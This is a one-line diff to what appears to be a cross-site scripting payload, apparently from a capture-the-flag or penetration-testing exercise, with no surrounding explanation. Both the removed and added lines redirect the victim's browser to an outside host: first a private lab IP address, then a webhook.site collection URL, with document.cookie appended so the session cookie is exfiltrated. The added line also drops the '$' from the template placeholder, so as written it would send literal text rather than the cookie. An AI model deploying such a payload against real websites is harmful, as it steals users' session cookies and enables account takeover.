@@ -1,1 +1,1 @@
-location.href=`http://10.10.14.2:8000/${document.cookie}`
+location.href=`https://webhook.site/8e14749c-6d9e-4bc1-80f4-80cdc8786e5f/{document.cookie}`
